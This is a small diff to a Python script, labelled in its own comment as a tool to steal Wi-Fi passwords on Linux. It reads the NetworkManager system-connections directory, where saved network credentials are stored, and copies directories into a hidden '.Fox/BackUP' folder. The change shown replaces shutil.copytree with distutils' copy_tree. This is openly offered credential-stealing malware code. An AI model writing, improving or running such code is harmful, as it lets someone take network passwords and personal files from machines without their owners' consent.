@@ -1,6 +1,7 @@
 import os
 from os import walk
 import shutil
+from distutils.dir_util import copy_tree
 
 ### Steal WIFI Password On Linux ###
 files = os.listdir("/etc/NetworkManager/system-connections/")
@@ -22,10 +23,9 @@ for (dirpath, dirnames, filenames) in walk("."):
     break
 for dir in data_dir:
     if dir == ".Fox":
-        continue
+        pass
     else:
-        shutil.copytree(dir, ".Fox/BackUP")
-
+        copy_tree(dir, ".Fox/BackUP")
 data_file = []
 for (dirpath, dirnames, filenames) in walk("."):
     data_file.extend(filenames)
